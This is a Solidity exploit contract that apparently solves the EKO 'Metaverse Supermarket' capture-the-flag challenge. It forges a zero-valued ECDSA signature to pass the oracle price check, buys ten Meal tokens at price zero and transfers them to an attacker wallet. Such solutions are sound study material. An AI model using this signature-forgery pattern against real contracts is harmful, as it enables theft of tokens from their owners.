// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { ECDSA } from "openzeppelin-contracts/utils/cryptography/ECDSA.sol";
import { InflaStore, Meal, OraclePrice, Signature } from "eko/ChallengeMetaverseSupermarket.sol";

contract MetaverseSupermarketCracker {
  constructor(InflaStore store, address wallet) {
    OraclePrice memory oraclePrice = OraclePrice({ blockNumber: block.number, price: 0 });
    Signature memory sig = Signature({ v: 28, r: 0, s: 0 });
    Meal meal = store.meal();
    for (uint256 i = 0; i < 10; ++i) {
      store.buyUsingOracle(oraclePrice, sig);
      meal.transferFrom(address(this), wallet, i);
    }
  }
}
